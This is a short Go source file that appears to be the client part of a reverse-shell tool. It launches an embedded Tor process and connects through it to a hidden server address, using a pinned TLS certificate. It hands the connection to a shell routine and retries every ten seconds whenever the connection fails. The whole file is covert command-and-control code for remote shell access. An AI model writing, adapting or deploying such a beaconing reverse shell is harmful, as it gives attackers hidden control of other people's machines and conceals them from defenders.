// +build !notor

package client

import (
	"crypto/tls"
	"crypto/x509"
	"net"
	"time"

	"github.com/cretz/bine/process/embedded"
	"github.com/cretz/bine/tor"
)

func connect(dialer *tor.Dialer) (net.Conn, error) {
	conn, err := dialer.Dial("tcp", serverAddr)
	if err != nil {
		return nil, err
	}
	caPool := x509.NewCertPool()
	caPool.AppendCertsFromPEM([]byte(serverCert))

	config := tls.Config{RootCAs: caPool, ServerName: serverDomain}
	tlsconn := tls.Client(conn, &config)
	if err != nil {
		return nil, err
	}
	return tlsconn, nil
}

// NetClient start tor and invoke connect
func NetClient() {
	var conf tor.StartConf
	conf = tor.StartConf{ProcessCreator: embedded.NewCreator()}

	t, err := tor.Start(nil, &conf)
	if err != nil {
		return
	}
	defer t.Close()
	dialer, _ := t.Dialer(nil, nil)
	for {
		conn, err := connect(dialer)
		if err != nil {
			time.Sleep(10 * time.Second)
			continue
		}
		c := new(connection)
		c.Conn = conn
		c.shell()
	}
}
